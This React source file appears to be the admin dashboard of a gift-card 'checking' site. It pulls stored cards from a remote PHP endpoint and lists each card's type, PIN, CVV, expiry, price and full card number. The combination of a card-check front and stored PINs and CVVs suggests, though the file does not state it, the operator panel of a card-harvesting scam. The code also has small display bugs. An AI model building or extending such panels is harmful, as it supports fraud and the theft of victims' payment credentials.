import React, { useState, useEffect } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

export default function AdminPanel() {
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const navigate = useNavigate();

  useEffect(() => {
    document.title = "Admin Panel - Gift Cards";
  }, []);

  const fetchCards = async () => {
    setLoading(true);
    setError(null);

    try {
      const response = await axios.get("https://checkyourcard.free.nf/apiv1/admin.php", {
        withCredentials: true,
        headers: { "Content-Type": "application/json" },
      });

      if (response.data?.success && Array.isArray(response.data.cards)) {
        setCards(response.data.cards);
      } else {
        setError(response.data?.error || "Failed to fetch cards");
      }
    } catch (err) {
      console.error("Error fetching cards:", err);
      setError("An error occurred while fetching cards");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (cards.length === 0) {
      fetchCards();
    }
  }, []);

  const handleLogout = () => {
    localStorage.removeItem("logged_in");
    localStorage.clear();
    navigate("/admin-login");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 text-white font-sans py-16 px-4">
      <div className="max-w-6xl mx-auto">
        <h2 className="text-3xl font-bold mb-8 text-center tracking-wide text-violet-300">
          ⚒️ Admin Panel
        </h2>

        {error && (
          <p className="text-red-500 bg-red-200 text-center mb-4 rounded-md p-2 outline-1 outline-red-500">
            {error}
          </p>
        )}

        <h2 className="text-center text-xl text-white mb-4 font-bold">UPLOADED GIFT CARDs</h2>

        <div className="overflow-x-auto bg-white/10 backdrop-blur rounded-xl shadow-lg border border-white/10">
          <table className="min-w-full text-sm text-left text-white">
            <thead className="uppercase text-xs bg-violet-700/80 text-white">
              <tr>
                <th className="px-6 py-4">#</th>
                <th className="px-6 py-4">Card Type</th>
                <th className="px-6 py-4">Card Pin</th>
                <th className="px-6 py-4">CVV</th>
                <th className="px-6 py-4">Expiry</th>
                <th className="px-6 py-4">Price</th>
                <th className="px-6 py-4">Card Number </th>
                <th className="px-10 py-4">Uploaded At</th>
              </tr>
            </thead>
            <tbody>
              {loading ? (
                <tr>
                  <td colSpan="4" className="px-6 py-4 text-center text-gray-400">
                    Loading cards...
                  </td>
                </tr>
              ) : (
                cards.map((card, index) => (
                  <tr key={card.id} className="border-b border-white/10 hover:bg-white/5 transition">
                    <td className="px-6 py-4">{index + 1}</td>
                    <td className="px-6 py-4 font-medium text-violet-200">{card.card_type}</td>
                    <td className="px-6 py-4 tracking-wider text-pink-200">{card.card_pin}</td>
                    <td className="px-6 py-4 tracking-wider text-pink-200">{card.cvv}</td>
                    <td className="px-6 py-4 tracking-wider text-pink-200">{card.expiry}</td>
                    <td className="px-6 py-4 tracking-wider text-pink-200">${card.price}</td>
                    <td className="px-6 py-4 tracking-wider text-pink-200">${card.card_number}</td>
                    <td className="px-6 py-4 text-gray-300">
                      {new Date(card.created_at).toLocaleString()}
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>

        <button
          onClick={handleLogout}
          className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700 transition mt-5"
        >
          Logout
        </button>
      </div>
    </div>
  );
}
